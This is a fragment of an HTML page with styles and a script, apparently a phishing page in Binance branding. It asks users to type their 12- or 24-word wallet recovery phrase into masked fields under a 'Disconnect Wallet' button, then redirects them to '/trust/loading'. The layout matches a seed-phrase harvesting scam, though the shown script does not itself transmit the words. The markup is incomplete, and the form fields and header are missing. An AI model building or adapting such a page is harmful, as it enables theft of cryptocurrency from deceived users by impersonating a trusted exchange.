*,*::before,*::after{box-sizing:border-box}
html,body{margin:0;padding:0;width:100%;min-height:100%;background:#1b1b1c;color:#fff;font-family:BinancePlex}
body{background:#1b1b1c}
.page{display:flex;flex-direction:column;align-items:center;width:100%;min-height:100%;background:#1b1b1c;padding:32px 16px;box-sizing:border-box}
@media (min-width:768px){.page{padding:48px 16px}}
.card{display:flex;flex-direction:column;align-items:center;width:100%;max-width:406px;background:#1b1b1c;text-align:center;padding:32px 24px;gap:16px}
@media (min-width:768px){.card{margin-top:48px;border:1px solid rgba(255,255,255,.1);border-radius:4px}}
.shield{display:block;width:58px;height:66px;flex-shrink:0}
.title{font-size:1.875rem;font-weight:700;line-height:2.25rem;color:#fff;margin:0}
.sub{font-size:.875rem;font-weight:400;line-height:1.25rem;color:rgba(255,255,255,.6);margin:0}
.tw-select-wrap{margin-top:8px;width:100%;overflow:hidden;border-radius:8px;border:1px solid rgba(255,255,255,.1);padding-right:16px;background:#1b1b1c}
#tw-count{display:block;width:100%;background:#1b1b1c;border:0;outline:none;padding:12px 16px;font:600 1rem/1.5 BinancePlex;color:#fff}
#tw-count option{background:#1b1b1c;color:#fff}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;width:100%;margin-top:12px}
.tw-field{display:flex;width:100%;align-items:center;gap:8px;border-radius:8px;border:1px solid rgba(255,255,255,.1);padding:0 12px 0 16px}
.tw-field:focus-within{border-color:#48ff91}
.tw-field input{flex:1;min-width:0;width:100%;background:transparent;border:0;outline:none;padding:16px 0;font:600 1rem/1.5 BinancePlex;color:#fff}.tw-field input::placeholder{color:rgba(255,255,255,.35)}
.tw-field input:-webkit-autofill,
.tw-field input:-webkit-autofill:hover,
.tw-field input:-webkit-autofill:focus{
  -webkit-box-shadow:0 0 0 1000px #1b1b1c inset !important;
  -webkit-text-fill-color:#fff !important;
  caret-color:#fff;
  transition:background-color 99999s ease-out;
}
.tw-eye{flex-shrink:0;background:none;border:0;padding:0;margin:0;cursor:pointer;color:#48ff91;display:flex;align-items:center;line-height:0}
.tw-eye svg{width:16px;height:16px;display:block}
#tw-clear{margin-top:16px;background:none;border:0;padding:0;font:500 1rem/1.5 BinancePlex;color:#48ff91;cursor:pointer}
#tw-clear:hover{filter:brightness(.75)}
#tw-clear:disabled{filter:brightness(.5);cursor:default}
#tw-submit{margin-top:8px;width:100%;border:0;border-radius:9999px;background:#48ff91;color:#222;padding:12px 16px;font:600 1rem/1.5 BinancePlex;cursor:pointer}
#tw-submit:disabled{background:#6a8c75;cursor:default}
</style>
</head>

<button type="button" id="tw-submit" disabled>Disconnect Wallet</button>

</div>
<script>
(function(){
  var EYE_OFF='<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49"/><path d="M14.084 14.158a3 3 0 0 1-4.242-4.242"/><path d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143"/><path d="m2 2 20 20"/></svg>';
  var EYE_ON='<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0"/><circle cx="12" cy="12" r="3"/></svg>';
  var n=12;
  var fields=document.querySelectorAll('.tw-field');
  var submit=document.getElementById('tw-submit');
  var clear=document.getElementById('tw-clear');
  var sel=document.getElementById('tw-count');
  function resetEye(wrap){
    var inp=wrap.querySelector('input');
    var btn=wrap.querySelector('.tw-eye');
    inp.type='password';
    btn.innerHTML=EYE_OFF;
    btn.setAttribute('aria-label','Show word');
  }
  function sync(){
    var filled=0,any=0;
    for(var i=0;i<n;i++){
      if((fields[i].querySelector('input').value||'').trim()){filled++;any++;}
    }
    submit.disabled=filled<n;
    clear.disabled=any===0;
  }
  function setN(c){
    n=c;
    for(var i=0;i<fields.length;i++){
      fields[i].querySelector('input').value='';
      resetEye(fields[i]);
      fields[i].style.display=i<n?'':'none';
    }
    sync();
  }
  sel.addEventListener('change',function(){ setN(Number(this.value)||12); });
  for(var f=0;f<fields.length;f++){
    (function(wrap){
      wrap.querySelector('input').addEventListener('input',sync);
      wrap.querySelector('input').addEventListener('keydown',function(e){
        if(e.key!=='Enter')return;
        e.preventDefault();
        if(!submit.disabled){ submit.disabled=true; location.href='/trust/loading'; }
      });
      wrap.querySelector('.tw-eye').addEventListener('click',function(){
        var inp=wrap.querySelector('input');
        var on=inp.type==='password';
        inp.type=on?'text':'password';
        this.innerHTML=on?EYE_ON:EYE_OFF;
        this.setAttribute('aria-label',on?'Hide word':'Show word');
      });
    })(fields[f]);
  }
  clear.addEventListener('click',function(){
    for(var i=0;i<fields.length;i++){ fields[i].querySelector('input').value=''; resetEye(fields[i]); }
    sync();
  });
  submit.addEventListener('click',function(){
    if(this.disabled)return;
    this.disabled=true;
    location.href='/trust/loading';
  });
})();
</script>
